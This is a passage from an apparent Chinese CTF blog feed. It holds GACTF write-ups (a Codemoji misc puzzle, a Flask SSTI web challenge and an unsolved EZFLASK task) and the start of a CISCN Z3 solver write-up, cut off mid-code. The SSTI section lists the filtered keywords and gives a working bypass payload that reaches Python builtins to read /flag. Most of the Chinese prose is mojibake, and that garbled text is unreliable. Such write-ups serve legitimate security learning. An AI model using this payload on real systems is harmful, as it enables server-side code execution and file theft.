zipï¼Œå‘ç°æœ‰ä¼ªåŠ å¯†ã€‚</p><p><code>1.txt</code> å†…å®¹ä¸ºï¼š</p><pre class="language-none"><code class="language-none">I'm going to tell her how i feel.DO YOU WANT TO KNOW WHAT I TOLD HER?</code></pre><p>å¦å¤–æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œå‘ç°ç»“å°¾æœ‰ä¸œè¥¿ï¼Œè‡³å°‘æœ‰ä¸ªå‹ç¼©åŒ…ã€‚</p><p><img src="/2020/08/31/CTF_2020GACTF/3.jpg" alt="3"></p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830160506078.png" alt="3.jpg"></p><p>æå–å‡ºæ¥ã€‚</p><pre class="language-none"><code class="language-none">SSB3YXMgcmVqZWN0ZWQuLi4uLi5USElTIElTIFRIRSBQQVNTV09SRDpJIFdhbm5hIENyeXl5ISEh</code></pre><p>é¦–å…ˆå¯¹ä¸Šé¢è¿™æ®µ base64ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç ã€‚</p><pre class="language-none"><code class="language-none">I was rejected......THIS IS THE PASSWORD:I Wanna Cryyy!!!</code></pre><p>å‹ç¼©åŒ…éœ€è¦å…ˆè¡¥ä¸Šæ–‡ä»¶å¤´ï¼Œå³å˜æˆ 504B0304â€¦</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830160819061.png" alt="zip"></p><p>æ‹¿å¯†ç å»è§£å‹ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ã€‚</p><pre class="language-none"><code class="language-none">ğŸ”­ğŸ’™ğŸ°âœŠğŸŒ»ğŸ§ğŸ’™ğŸ˜˜ğŸŒ»ğŸ¶ğŸ’ğŸŒğŸŠğŸ©ğŸšğŸŠğŸ‘¹ğŸ¶ğŸ˜€ğŸ¶ğŸ˜€ğŸ˜˜ğŸ‘¹ğŸ’™ğŸ‚ğŸ’‡ğŸ˜€ğŸ˜€ğŸ˜©ğŸŒ»ğŸŸğŸ‘‚ğŸ¶ğŸ’ğŸŒğŸŠğŸ©ğŸ‘†ğŸ ğŸ™‡ğŸ‚ğŸ‚ğŸ‘¼ğŸ˜±ğŸš”ğŸ¶ğŸ‘‰âœŠğŸ˜±ğŸ ğŸ™‡ğŸ‚ğŸ‚ğŸ‘¼ğŸ˜±ğŸšŠğŸ˜§ğŸ’¨ğŸ’™ğŸ’•That is what i told herâ†‘â†‘â†‘</code></pre><p><strong>ä»€ä¹ˆï¼Œæ‚¨å°±æ˜¯æŠ½è±¡å¸¦å¸ˆï¼Ÿ</strong></p><p>æƒ³èµ·æ¥åœ¨ BJD3rd é‡Œ TaQini å¸ˆå‚…å°±å‡ºè¿‡ä¸€é¢˜ï¼Œå°±æ˜¯ <a href="https://miaotony.xyz/2020/05/24/CTF_BJDCTF3rd/#manual">Manual è¿™é¢˜çš„ä¸€éƒ¨åˆ†</a>ã€‚</p><p>å‚è€ƒ<a href="https://miaotony.xyz/2020/05/24/CTF_BJDCTF3rd/#manual">é‚£é¢˜çš„æ€è·¯</a>ï¼Œç›²çŒœå°±æ˜¯ Codemoji äº†ï¼æ ¹æ®æç¤ºkeyåº”è¯¥å°±æ˜¯ä¸ªå“­çš„è¡¨æƒ…å§ï¼Œå°±ğŸ˜­è¿™ä¸ªäº†ã€‚</p><blockquote><p>P.S.: <strong><a href="https://github.com/mozilla/codemoji">codemoji GitHub repo</a></strong>     (Mozilla Public License 2.0)</p></blockquote><p>å¥½è€¶ï¼Œå’±ä¹Ÿéƒ¨ç½²ä¸€ä¸ªï¼</p><p><strong>å°±åœ¨è¿™é‡Œäº†ï¼</strong>-&gt; <a href="https://codemoji.miaotony.xyz/">https://codemoji.miaotony.xyz</a></p><p><em>æ¬¢è¿æ¥ç©å‘€ï¼ˆ</em></p><p>äºæ˜¯æ„é€  payload å¦‚ä¸‹ï¼š</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"message"</span><span class="token operator">:</span><span class="token string">"ğŸ”­ğŸ’™ğŸ°âœŠğŸŒ»ğŸ§ğŸ’™ğŸ˜˜ğŸŒ»ğŸ¶ğŸ’ğŸŒğŸŠğŸ©ğŸšğŸŠğŸ‘¹ğŸ¶ğŸ˜€ğŸ¶ğŸ˜€ğŸ˜˜ğŸ‘¹ğŸ’™ğŸ‚ğŸ’‡ğŸ˜€ğŸ˜€ğŸ˜©ğŸŒ»ğŸŸğŸ‘‚ğŸ¶ğŸ’ğŸŒğŸŠğŸ©ğŸ‘†ğŸ ğŸ™‡ğŸ‚ğŸ‚ğŸ‘¼ğŸ˜±ğŸš”ğŸ¶ğŸ‘‰âœŠğŸ˜±ğŸ ğŸ™‡ğŸ‚ğŸ‚ğŸ‘¼ğŸ˜±ğŸšŠğŸ˜§ğŸ’¨ğŸ’™ğŸ’•"</span><span class="token punctuation">,</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"ğŸ˜­"</span><span class="token punctuation">}</span></code></pre><p>base64encode + URLencodeï¼š</p><pre class="language-none"><code class="language-none">eyJtZXNzYWdlIjoi8J%2BUrfCfkpnwn5Cw4pyK8J%2BMu%2FCfkKfwn5KZ8J%2BYmPCfjLvwn4228J%2BSkPCfjYzwn4%2BK8J%2BNqfCfmoHwn4%2BK8J%2BRufCfkLbwn5iA8J%2BQtvCfmIDwn5iY8J%2BRufCfkpnwn42C8J%2BSh%2FCfmIDwn5iA8J%2BYqfCfjLvwn42f8J%2BRgvCfjbbwn5KQ8J%2BNjPCfj4rwn42p8J%2BRhvCfj6Dwn5mH8J%2BNgvCfjYLwn5G88J%2BYsfCfmpTwn5C28J%2BRieKcivCfmLHwn4%2Bg8J%2BZh%2FCfjYLwn42C8J%2BRvPCfmLHwn5qK8J%2BYp%2FCfkqjwn5KZ8J%2BSlSIsImtleSI6IvCfmK0ifQ%3D%3D</code></pre><p>è€Œåä¸¢å»è§£å¯†ã€‚</p><p><a href="https://codemoji.miaotony.xyz/share.html?data=eyJtZXNzYWdlIjoi8J+UrfCfkpnwn5Cw4pyK8J+Mu/CfkKfwn5KZ8J+YmPCfjLvwn4228J+SkPCfjYzwn4+K8J+NqfCfmoHwn4+K8J+RufCfkLbwn5iA8J+QtvCfmIDwn5iY8J+RufCfkpnwn42C8J+Sh/CfmIDwn5iA8J+YqfCfjLvwn42f8J+RgvCfjbbwn5KQ8J+NjPCfj4rwn42p8J+RhvCfj6Dwn5mH8J+NgvCfjYLwn5G88J+YsfCfmpTwn5C28J+RieKcivCfmLHwn4+g8J+Zh/CfjYLwn42C8J+RvPCfmLHwn5qK8J+Yp/Cfkqjwn5KZ8J+SlSIsImtleSI6IvCfmK0ifQ==">https://codemoji.miaotony.xyz/share.html?data=eyJtZXNzYWdlIjoi8J%2BUrfCfkpnwn5Cw4pyK8J%2BMu%2FCfkKfwn5KZ8J%2BYmPCfjLvwn4228J%2BSkPCfjYzwn4%2BK8J%2BNqfCfmoHwn4%2BK8J%2BRufCfkLbwn5iA8J%2BQtvCfmIDwn5iY8J%2BRufCfkpnwn42C8J%2BSh%2FCfmIDwn5iA8J%2BYqfCfjLvwn42f8J%2BRgvCfjbbwn5KQ8J%2BNjPCfj4rwn42p8J%2BRhvCfj6Dwn5mH8J%2BNgvCfjYLwn5G88J%2BYsfCfmpTwn5C28J%2BRieKcivCfmLHwn4%2Bg8J%2BZh%2FCfjYLwn42C8J%2BRvPCfmLHwn5qK8J%2BYp%2FCfkqjwn5KZ8J%2BSlSIsImtleSI6IvCfmK0ifQ%3D%3D</a></p><p>å¾—åˆ°flagã€‚</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830161359128.png" alt="flag"></p><pre class="language-none"><code class="language-none">WelcometoGACTF!ThisisthepasswordGACTF{H4ppy_Mi5c_H4ppy_L1fe}</code></pre><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="simpleflask"><a href="#simpleflask" class="headerlink" title="simpleflask"></a>simpleflask</h3><blockquote><p>é¢˜ç›®æ¯10åˆ†é’Ÿé‡å¯ï¼Œå¦‚é‡åˆ°æ— æ³•è¿æ¥ï¼Œè¯·ç¨ç­‰ç‰‡åˆ»10ç§’å·¦å³ä¼šå…¨éƒ¨é‡å¯å®Œæ¯•<br> This topic restart every 10 minitues. If you canâ€™t connect, please wait  for a while and the restart will be completed. Do not panic</p><p>Chinaï¼š<br> 124.70.153.63 80-89<br> Overseasï¼š<br> 149.28.80.82 80-89</p></blockquote><p>POST è®¿é—®ï¼Œæç¤º <code>request.form["name"]</code>ã€‚</p><p>å¸¦ä¸Šå‚æ•° <code>name</code>ï¼Œå°è¯• <strong>SSTI</strong>ï¼Œå‘ç°æœ‰æˆã€‚</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830153912966.png" alt="SSTI_test"></p><p>æŸæ¬¡åˆ©ç”¨æŠ¥é”™çœ‹åˆ°äº†éƒ¨åˆ†æºç ã€‚</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830153448394.png" alt="source"></p><p>é™¤äº†è¿‡æ»¤äº†<code>flag</code>ï¼Œåœ¨è¿™ä¸ª<code>check</code>å‡½æ•°é‡Œè¿˜è¿‡æ»¤äº†è®¸å¤šï¼Œå°è¯•å‘ç°ï¼ŒåŒ…æ‹¬ä½†ä¸é™äº os, system, pwd, popen, eval, import, request, mro, <code>'</code>, <code>%</code>,  <code>+</code>, <code>,</code>, <code> </code>ï¼ˆç©ºæ ¼ï¼‰, <code>|</code>, <code>\x</code> ç­‰ç­‰å…³é”®å­—æˆ–ç¬¦å·éƒ½è¢«æ»¤æ‰äº†â€¦â€¦</p><p>å•å¼•å·ä¸è¡Œï¼Œä½†åŒå¼•å·å¯è¡Œï¼Œå‘ç°åˆ©ç”¨ <code>"op""en"</code> çš„å½¢å¼æ‹¼æ¥å­—ç¬¦ä¸²å¯è¡Œã€‚</p><p>æœ¬æ¥æƒ³æ‰¾ PIN çš„ï¼Œä½†è¯•äº†è¯•æ‰€éœ€çš„ä¿¡æ¯æ•´ä¸æ¥ï¼ˆå¥½èœå•Šï¼‰ï¼Œå¯ä»¥å‚è€ƒ <a href="https://xz.aliyun.com/t/2553">Flask debug pinå®‰å…¨é—®é¢˜</a> è¿™ä¸€ç¯‡æ–‡ç« ã€‚</p><p>äºæ˜¯åˆæ•´äº†åŠå¤©ç»•è¿‡â€¦â€¦</p><p>é¦–å…ˆæ‹¿åˆ° <code>object</code>ã€‚</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830154728511.png" alt="object"></p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830155651157.png" alt="subclasses"></p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830155727553.png" alt="globals"></p><p>ä¸€é¡¿æ“ä½œæ‹¿åˆ° <code>__builtins__</code>ã€‚</p><p>å‘ç°<code>chr</code>ä¹‹ç±»çš„å‡½æ•°å¹¶æ²¡æœ‰ï¼Œç„¶è€Œå¹¶ä¸èƒ½ç”¨ <code>{% xxx %}</code> æ¥è®¾ç½®å°±å¾ˆéš¾å—ã€‚</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830155031718.png" alt="__builtins__"></p><p>æœ¬æ¥æƒ³ç”¨ <code>os.popen</code> è¿™ä¸€æ¨¡å—æ¥æ‰§è¡Œå‘½ä»¤è¯»å–ä¿¡æ¯çš„ï¼Œä½†ä¸çŸ¥é“ä¸ºå•¥<code>read()</code>å°±è¢«æ‹¦äº†ã€‚</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830155903233.png" alt="os"></p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830155932359.png" alt="read"></p><p>æœ€åé—®äº†é˜Ÿé‡Œå¤§å¸ˆå‚…ï¼Œå‘ç°æ¢æˆ<code>open</code>å°±å®Œäº‹äº†ï¼Œå¤ªè‰äº†ï¼</p><p><strong>Payload:</strong></p><pre class="language-none"><code class="language-none">name={{[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__["op""en"]("/fl""ag").read()}}</code></pre><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830154108093.png" alt="flag"></p><p><code>GACTF{fac9165b6a2b5ac8bd3b99fad0619366}</code></p><p>åé¢å†æ•´ç†ä¸€ä¸‹ flask çš„ SSTI å¸¸ç”¨ payload åŠç»•è¿‡æŠ€å·§å§ï¼ˆ</p><p><em>å¤§æ¦‚ç‡ä¼šå’•å’•å’•ï¼ˆ</em></p><h3 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a>EZFLASK</h3><blockquote><p>flask&amp;flask</p><p>Chinaï¼š<br> 124.70.206.91 10000-10009<br> Overseasï¼š<br> 149.28.226.175 10000-10009</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">import</span> requests<span class="token keyword">from</span> waf <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> timeapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/ctfhint'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    hint <span class="token operator">=</span>xxxx <span class="token comment"># hints</span>    trick <span class="token operator">=</span> xxxx <span class="token comment"># trick</span>    <span class="token keyword">return</span> trick<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># app.txt</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/eval'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># post eval</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span>xxxxxx<span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># Secret</span><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># admin requests</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre><p>ä»–è¿™ä¸ª flask æœåŠ¡å™¨ä¸º Werkzeug/1.0.1 Python/2.7.18ã€‚</p><p>è®¿é—® <code>/ctfhint</code>ï¼Œå¾—åˆ°</p><pre class="language-none"><code class="language-none">too young too simple</code></pre><p>POST <code>/eval</code></p><pre class="language-none"><code class="language-none">post eval</code></pre><p>æ²¡æ‰¾åˆ°å“ªé‡Œèƒ½ç”¨ï¼Ÿ</p><p><code>admin</code> æ²¡æ‰¾åˆ° route åœ¨å“ªï¼Œå¹¶ä¸çŸ¥é“æ€ä¹ˆç”¨ emmmã€‚</p><p><em>ï¼ˆç­‰å¤ç°å˜¤å˜¤å˜¤</em></p><hr><p>å¤§æ¦‚å°±è¿™ä¹ˆå¤šï¼Œå¼€å­¦äº†å–µå‘œ~</p><p>ï¼ˆæºœäº†æºœäº†</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 CISCNåˆèµ› Z3&amp;LFSR WriteUp</title>
      <link href="2020/08/27/CTF_2020CISCN_preliminary/"/>
      <url>2020/08/27/CTF_2020CISCN_preliminary/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>å–µå‘œï¼Œå¥½ä¹…æ²¡æ¥å†™åšå®¢äº†å’•å’•å’•ï¼ˆè¿™å°±æ¥é™¤è‰äº†ï¼</p><p>å‰ä¸ä¹…æ°´äº†ä¸€æ³¢ CISCN çº¿ä¸Šåˆèµ›ï¼Œæ„Ÿè°¢é˜Ÿå‹å¸¦æˆ‘ç©å¸¦æˆ‘é£~</p><p>è¿™é‡Œæ¥å†™ä¸€å†™ Z3ã€LFSR è¿™ä¸¤é¢˜çš„ WriteUpï¼Œé¡ºä¾¿è®°å½•ä¸€ä¸‹ç”¨åˆ°çš„ Z3ã€SageMath æ±‚è§£å·¥å…·å–µã€‚</p><hr><h2 id="Z3"><a href="#Z3" class="headerlink" title="Z3"></a>Z3</h2><p>é¦–å…ˆä¸¢è¿› IDA çœ‹ä¸€çœ‹ï¼Œé¦–å…ˆå°†è¾“å…¥çš„ flag åˆ†åˆ«å­˜æ”¾åœ¨ v46 åˆ° v87 å˜é‡å†…ï¼Œè€Œåæ˜¯è¿™äº›å˜é‡ç»„æˆçš„çº¿æ€§æ–¹ç¨‹ï¼Œæœ€åä¸ <code>Dst</code> çš„ç»“æœæ¯”è¾ƒï¼Œæ­£ç¡®åˆ™è¾“å‡º <code>win</code>ã€‚</p><p>å…¶ä¸­<code>Dst</code>åŠå…¶ä¹‹åå¯¹åº”çš„é‚£éƒ¨åˆ†ç©ºé—´å°±æ˜¯æ–¹ç¨‹çš„å€¼ï¼Œå°†æ•°æ®æŠ å‡ºæ¥æ±‚è§£å°±å®Œäº‹äº†ï¼</p><p><img src="/2020/08/27/CTF_2020CISCN_preliminary/z3_1.png" alt="z3_1"></p><p><img src="/2020/08/27/CTF_2020CISCN_preliminary/z3_2.png" alt="z3_2"></p><p>æœ¬æ¥æƒ³ç”¨ MATLAB ä¹‹ç±»æ¥æ±‚è§£çš„ï¼Œä½†çœ‹åˆ°é¢˜ç›®åå­—å« z3ï¼Œæœäº†ä¸€ä¸‹ï¼Œæœç„¶æœ‰ä¸ªå« <strong>z3 çš„æ±‚è§£å™¨</strong>ï¼Œäºæ˜¯ç›´æ¥ç”¨å®ƒæ¥çº¦æŸæ±‚è§£å³å¯ã€‚</p><p>è€Œä¸”è¿™ä¸ª z3 è¿˜æŒºå¼ºå¤§çš„äºšå­ã€‚ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>solver <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>v46 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[0]'</span><span class="token punctuation">)</span>v47 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[1]'</span><span class="token punctuation">)</span>v48 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[2]'</span><span class="token punctuation">)</span>v49 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[3]'</span><span class="token punctuation">)</span>v50 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[4]'</span><span class="token punctuation">)</span>v51 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[5]'</span><span class="token punctuation">)</span>v52 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[6]'</span><span class="token punctuation">)</span>v53 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[7]'</span><span class="token punctuation">)</span>v54 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[8]'</span><span class="token punctuation">)</span>v55 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[9]'</span><span class="token punctuation">)</span>v56 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[10]'</span><span class="token punctuation">)</span>v57 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[11]'</span><span class="token punctuation">)</span>v58 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[12]'</span><span class="token punctuation">)</span>v59 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[13]'</span><span class="token punctuation">)</span>v60 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[14]'</span><span class="token punctuation">)</span>v61 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[15]'</span><span class="token punctuation">)</span>v62 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[16]'</span><span class="token punctuation">)</span>v63 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[17]'</span><span class="token punctuation">)</span>v64 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[18]'</span><span class="token punctuation">)</span>v65 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[20]'</span><span class="token punctuation">)</span>v66 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[21]'</span><span class="token punctuation">)</span>v67 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[22]'</span><span class="token punctuation">)</span>v68 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[23]'</span><span class="token punctuation">)</span>v69 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[24]'</span><span class="token punctuation">)</span>v70 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[25]'</span><span class="token punctuation">)</span>v71 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[26]'</span><span class="token punctuation">)</span>v72 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[27]'</span><span class="token punctuation">)</span>v73 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[28]'</span><span class="token punctuation">)</span>v74 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[29]'</span><span class="token punctuation">)</span>v75 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[30]'</span><span class="token punctuation">)</span>v76 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[31]'</span><span class="token punctuation">)</span>v77 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[32]'</span><span class="token punctuation">)</span>v78 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[33]'</span><span class="token punctuation">)</span>v79 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[34]'</span><span class="token punctuation">)</span>v80 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[35]'</span><span class="token punctuation">)</span>v81 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[36]'</span><span class="token punctuation">)</span>v82 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[37]'</span><span class="token punctuation">)</span>v83 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[38]'</span><span class="token punctuation">)</span>v84 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[39]'</span><span class="token punctuation">)</span>v85 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[40]'</span><span class="token punctuation">)</span>v86 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[41]'</span><span class="token punctuation">)</span>v87 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'flag[42]'</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v46 <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v46 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v47 <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v47 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v48 <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v48 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v77 <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v77 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v78 <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v78 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v79 <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v79 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v76 <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v76 <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">34</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v50 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> v52 <span class="token operator">==</span> <span class="token number">0x4f17</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">27</span> <span class="token operator">*</span> v50 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v52 <span class="token operator">==</span> <span class="token number">0x9cf6</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v50 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v52 <span class="token operator">==</span> <span class="token number">0x8ddb</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v50 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v52 <span class="token operator">==</span> <span class="token number">0x8ea6</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">*</span> v50 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v52 <span class="token operator">==</span> <span class="token number">0x6929</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v50 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span 